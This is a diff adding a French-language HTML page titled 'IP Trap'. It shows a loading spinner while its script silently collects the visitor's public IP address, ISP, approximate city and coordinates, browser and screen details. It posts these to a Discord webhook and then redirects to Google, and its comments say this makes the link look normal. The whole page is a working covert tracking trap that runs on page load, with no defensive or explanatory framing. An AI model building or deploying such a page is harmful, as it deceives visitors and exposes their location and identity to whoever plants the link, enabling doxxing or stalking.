@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chargement…</title>
+  <style>
+    :root { color-scheme: dark; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: #0b0f19; color: #e5e7eb;
+    }
+    .wrap { text-align: center; }
+    .spin {
+      width: 42px; height: 42px; margin: 0 auto 18px;
+      border: 4px solid #1f2937; border-top-color: #3b82f6;
+      border-radius: 50%; animation: s .9s linear infinite;
+    }
+    @keyframes s { to { transform: rotate(360deg); } }
+    p { opacity: .7; font-size: 15px; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="spin"></div>
+    <p>Chargement du contenu…</p>
+  </div>
+
+  <script>
+  (async function () {
+    // ══════════════════ CONFIG ══════════════════
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/TON_ID/TON_TOKEN";
+    const REDIRECT    = "https://www.google.com"; // "" = ne pas rediriger
+    const DELAY_MS    = 1400;
+    // ════════════════════════════════════════════
+
+    const info = {
+      ts: new Date().toISOString(),
+      ip: null, isp: null, city: null, country: null,
+      lat: null, lon: null, asn: null,
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || "direct",
+      page: location.href
+    };
+
+    // 1) IP publique + géoloc (côté client = vraie IP du visiteur)
+    try {
+      const r = await fetch("https://ipwho.is/");
+      const j = await r.json();
+      if (j && j.success !== false) {
+        info.ip      = j.ip;
+        info.isp     = j.connection?.isp || j.connection?.org || "?";
+        info.asn     = j.connection?.asn ? "AS" + j.connection.asn : "?";
+        info.city    = j.city;
+        info.country = j.country;
+        info.lat     = j.latitude;
+        info.lon     = j.longitude;
+      }
+    } catch (e) {}
+
+    // 2) Fallback si le service principal est down
+    if (!info.ip) {
+      try { info.ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch (e) {}
+    }
+
+    // 3) Exfiltration vers Discord
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "🎯 IP Trap",
+          embeds: [{
+            title: "Nouvelle visite",
+            color: 0x3b82f6,
+            fields: [
+              { name: "IP",       value: info.ip || "?",          inline: true },
+              { name: "FAI",      value: info.isp || "?",         inline: true },
+              { name: "ASN",      value: info.asn || "?",         inline: true },
+              { name: "Ville",    value: info.city || "?",        inline: true },
+              { name: "Pays",     value: info.country || "?",     inline: true },
+              { name: "Coords",   value: `${info.lat}, ${info.lon}`, inline: true },
+              { name: "Fuseau",   value: info.tz,                 inline: true },
+              { name: "Écran",    value: info.screen,             inline: true },
+              { name: "Référant", value: info.referrer,           inline: true },
+              { name: "User-Agent", value: "```" + info.ua.slice(0, 200) + "```", inline: false }
+            ],
+            footer: { text: "IP Trap • GitHub Pages" },
+            timestamp: info.ts
+          }]
+        })
+      });
+    } catch (e) {}
+
+    window.__trap = info;
+
+    // 4) Redirection (le lien semble normal)
+    if (REDIRECT) setTimeout(() => location.replace(REDIRECT), DELAY_MS);
+  })();
+  </script>
+</body>
+</html>
